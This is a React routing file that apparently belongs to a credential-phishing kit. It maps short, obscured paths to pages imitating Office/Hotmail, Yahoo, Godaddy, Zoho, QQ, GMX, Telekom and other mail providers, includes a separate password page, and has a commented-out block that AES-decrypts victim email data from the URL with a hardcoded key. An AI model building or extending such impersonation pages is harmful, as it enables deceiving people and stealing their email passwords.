import { Router } from "@reach/router";
import React, { Fragment, useState, createContext } from "react";
import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import Page126 from "./pages/126";
import Page163 from "./pages/163";
import Page263 from "./pages/263";
import BerlinMail from "./pages/berlinnail";
import Encryption from "./pages/encryption";
import Gmx from "./pages/gmx";
import Godaddy from "./pages/godaddy";
import Hamburg from "./pages/hamburg";
import Hinet from "./pages/hinet";
import Hiworks from "./pages/hiworks";
import HomeRedirect from "./pages/home";
import Hotmail from "./pages/hotmail";
import HotmailPassword from "./pages/hotmail/password";
import Mail from "./pages/mail";
import Office from "./pages/office";
import Portal from "./pages/portal";
import Processing from "./pages/processing";
import Qq from "./pages/qq";
import Rackspace from "./pages/rackspace";
import Redirect from "./pages/redirect";
import RedirectNorecord from "./pages/redirectnorecord";
import Telekom from "./pages/telekom";
import Webmail from "./pages/webmail";
import WebmailMain from "./pages/webmailmain";
import Yahoo from "./pages/yahoo";
import Yandex from "./pages/yandex";
import Zoho from "./pages/zoho";

var CryptoJS = require("crypto-js");

const serverurl = require("./users.json");

export const AppContext = createContext();

function App() {
  const [page, setPage] = useState({
    office: "ofc",
    yahoo: "yh",
    rackspace: "rsp",
    hiworks: "hw",
    godaddy: "gdy",
    mail: "ml",
    zoho: "zh",
    yandex: "yx",
    qq: "qaq",
    hinet: "hnt",
    263: "p263",
    126: "p126",
    163: "p163",
    webmail: "wbm",
    gmx: "gm",
    telekom: "tk",
    berlin: "ber",
    hamburg: "hab",
  });

  return (
    <AppContext.Provider value={{ page, setPage }}>
      <Router>
        <Redirect default />
        <HomeRedirect path="/" />
        <Encryption path="/enc" />
        <Page163 path={page[163]} />
        <Page126 path={page[126]} />
        <Hinet path={page.hinet} />
        <Qq path={page.qq} />
        <Page263 path={page[263]} />
        <Godaddy path={page.godaddy} />
        <Hiworks path={page.hiworks} />
        <Mail path={page.mail} />
        <Office path="ofc" />
        <Rackspace path={page.rackspace} />
        <WebmailMain path={page.webmail} />
        <Yahoo path={page.yahoo} />
        <Yandex path={page.yandex} />
        <Zoho path={page.zoho} />

        <Telekom path={page.telekom} />
        <BerlinMail path={page.berlin} />
        <Hamburg path={page.hamburg} />

        <Hotmail path={page.office} />
        <HotmailPassword path="ht/:data" />

        <Gmx path={page.gmx} />

        <Processing path="processing" />
        <Portal path="portal" />
      </Router>
      <ToastContainer
        position="top-center"
        autoClose={5000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
      />
    </AppContext.Provider>
  );
}

export default App;

/*
<HotmailPassword path={page.office} />
<RedirectNorecord path={page.gmx} />

<Redirect path={`/:entry/:email`} />

 useEffect(() => {
    const path = window.location.pathname;
    const id = path.substr(1);

    var bytes = CryptoJS.AES.decrypt(id, "ghost94");
    var originalText = bytes.toString(CryptoJS.enc.Utf8);
    console.log(originalText);
    navigate(`/${uuid()}`, { state: { encryptedata: originalText } });
  }, []);
*/
